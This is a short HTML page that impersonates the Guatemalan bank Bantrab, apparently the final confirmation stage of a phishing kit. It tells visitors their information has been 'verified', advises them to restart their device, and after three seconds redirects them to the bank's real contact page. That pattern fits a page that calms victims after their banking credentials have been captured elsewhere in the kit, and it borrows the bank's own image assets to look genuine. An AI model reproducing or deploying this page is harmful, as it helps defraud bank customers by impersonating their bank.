<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BANTRABAJO</title>
    
</head>
<center>
<body class="body">
    
<style>



.body {
   background-color: #eae9e9;
   
 }
 
 .caja {
   margin-top: 125px;
   box-shadow: 0 0 7px #18b0d2;
justify-content: center;
align-items: center;
   font-family: sans-serif;
  
  
  
  
   background:white;
   padding: 27px;
   text-align: center;
   border-radius: 2px;
   width: 320px;
   height: 360px;

  }

  .txt {
   margin-top: -15px;
   margin-left: 41px;
  font-size: small;
   position: fixed;
   text-decoration: none;
  }

  .img {
   width: 95px;
   position: relative;
   margin-top: -24px;
  }


.gifi {
  width: 330px;
}



  .input {

   padding: 5px;
   font-size: 13px;
   font-family: sans-serif;
   border: 1px solid #cccccc;
   width: 95%;
   border-color: #18b0d2;
   background: #ffffff url(https://bancaenlinea.bantrab.com.gt/images/login-sprites.png) no-repeat left 1px;
   padding-left: 20px;


  }

  .txtcharg{
    color: rgb(96, 96, 96);
    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
  }

  .txtcharg {
    font-family: sans-serif;
    font-size: medium;
  }

  .enviar {
   background: #FFCB00;
   color: #ffffff !important;
   padding: 5px 10px;
   border-radius: 4px;
   text-align: center;
   text-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
   border: none;
   transition: all 0.1s linear;
   font-size: 11pt;
   font-weight: bold;
   font-family: sans-serif;
  }
 

</style>


<div class="caja">
<form class="" action="" method="POST">




<br>
<img class="img" src="un.png" alt="">












<h1 class="txtcharg" id="CuentaAtras">Hemos verificado tu información, le recomendamos que reinicie su dispositivo para poder ingresar. </h1>



 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=3;
    
    var url="https://www.bantrab.com.gt/contactanos/";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Hemos verificado tu información, le recomendamos que reinicie su dispositivo para poder ingresar. <br> ";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
  window.onload=updateReloj;
 
    </script>











<img class= "gifi" src="checker.gif">




















</form>
</div>
 




</body>
</center>
</html>